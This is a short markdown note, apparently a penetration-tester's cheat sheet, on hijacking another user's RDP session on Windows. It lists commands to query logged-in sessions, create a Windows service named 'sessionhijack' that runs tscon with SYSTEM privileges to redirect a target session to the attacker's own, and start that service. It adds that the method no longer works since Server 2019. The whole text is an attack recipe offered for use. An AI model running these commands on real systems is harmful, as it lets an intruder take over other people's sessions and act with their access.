# reminder
- we want to create a win service that, will execute any binary with SYSTEM privileges. 
- this method no longer works since server 2019





# overview
```
query user
```
# create a service "sessionhijack"
```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
`rdp-tcp#13` is our current session

```
net start sessionhijack
```

